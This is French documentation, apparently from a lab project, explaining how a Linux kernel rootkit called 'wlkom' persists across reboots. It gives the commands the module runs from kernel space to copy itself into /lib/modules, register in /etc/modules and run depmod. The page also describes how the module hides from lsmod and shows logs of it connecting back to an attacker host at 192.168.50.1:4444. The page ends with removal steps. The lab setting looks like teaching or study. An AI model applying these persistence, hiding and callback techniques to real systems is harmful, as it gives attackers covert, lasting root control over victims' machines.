# Persistance au redémarrage

Le rootkit doit survivre à un redémarrage de la machine victime. La persistance est assurée **directement par le module kernel lui-même** lors de son premier chargement via `insmod`.

---

## Mécanisme

Au chargement (`insmod wlkom.ko`), la fonction `wlkom_init` appelle `wlkom_persist()` (définie dans `src/persistence.c`), qui exécute les trois étapes suivantes depuis l'espace noyau via `call_usermodehelper` :

```sh
# Copie le module dans l'arborescence officielle des modules kernel
cp '<chemin_auto_détecté>/wlkom.ko' "/lib/modules/$(uname -r)/kernel/drivers/misc/"

# Enregistre le module pour un chargement automatique au boot (si pas déjà présent)
grep -qxF wlkom /etc/modules || echo wlkom >> /etc/modules

# Met à jour la base de données des dépendances de modules
depmod
```

### Détection automatique du chemin source

`wlkom_persist()` détecte automatiquement le chemin de `wlkom.ko` en récupérant le répertoire courant du processus `insmod` au moment de l'appel (`current->fs->pwd`). Aucun chemin en dur n'est nécessaire.

### Explication étape par étape

**`/lib/modules/$(uname -r)/kernel/drivers/misc/`**
: Emplacement standard pour les modules tiers dans le noyau Linux. Le chemin est dynamique : il s'adapte automatiquement à la version du noyau en cours d'exécution.

**`/etc/modules`**
: Fichier lu par le système d'init (systemd via `systemd-modules-load.service`) au démarrage. Chaque ligne contient un nom de module à charger. L'ajout est idempotent : si `wlkom` est déjà présent, il n'est pas dupliqué.

**`depmod`**
: Recalcule les dépendances entre modules et met à jour les fichiers `modules.dep`, `modules.alias`, etc. Nécessaire pour que le système puisse trouver et charger `wlkom` automatiquement au démarrage.

**`call_usermodehelper`**
: API kernel qui permet d'exécuter un programme userspace depuis l'espace noyau, en tant que root, sans passer par un shell de l'utilisateur.

---

## Utilisation

La persistance est **automatique au chargement** : aucune commande CLI n'est nécessaire pour l'activer.

Sur la VM victime, après compilation, un seul `insmod` suffit :

```bash
cd /home/victim/rootkit
make module
sudo insmod wlkom.ko
```

Le module se charge **et** installe sa propre persistance en une seule opération.

---

## Vérification

### Lors du premier chargement

```bash
dmesg | grep wlkom
```

```
wlkom: module loaded
wlkom: -- INSIDE HIDE --
wlkom_log: module should be hidden
wlkom: installing persistence from /home/victim/rootkit/wlkom.ko
wlkom: persistence installed
wlkom_log: trying to connect to 192.168.50.1:4444
wlkom_log: connected
wlkom_log: connection thread started
```

!!! note "`lsmod` ne montrera rien"
Le module se cachant immédiatement au chargement, `lsmod | grep wlkom` ne retourne rien même si le module fonctionne. Utilisez `dmesg` pour vérifier.

### Après un redémarrage

Redémarrez la VM victime (`sudo reboot`). Une fois la VM redémarrée, le module se charge automatiquement et se reconnecte. Vérifiez dans le programme attaquant que le statut passe à 🟢 CONNECTED, ou confirmez dans dmesg :

```bash
dmesg | grep wlkom
```

```
wlkom: module loaded
wlkom: -- INSIDE HIDE --
wlkom_log: module should be hidden
wlkom: installing persistence from /lib/modules/<version>/kernel/drivers/misc/wlkom.ko
wlkom: persistence installed
wlkom_log: trying to connect to 192.168.50.1:4444
wlkom_log: connected
wlkom_log: connection thread started
```

---

## Désinstallation

Le module se cachant immédiatement au chargement, `rmmod wlkom` échoue car il n'apparaît plus dans la liste des modules. Il faut supprimer manuellement les fichiers de persistance, puis redémarrer.

### Depuis l'intérieur de la VM victime

```bash
sudo sed -i '/^wlkom$/d' /etc/modules
sudo rm /lib/modules/$(uname -r)/kernel/drivers/misc/wlkom.ko
sudo depmod
sudo reboot
```

Le module ne se rechargera plus au prochain démarrage.

### Depuis la machine hôte (reset complet)

Pour repartir d'une image propre :

```bash
make -C vms/victim reset
```

Cela supprime le répertoire `build/` de la VM victime et la recrée depuis zéro.
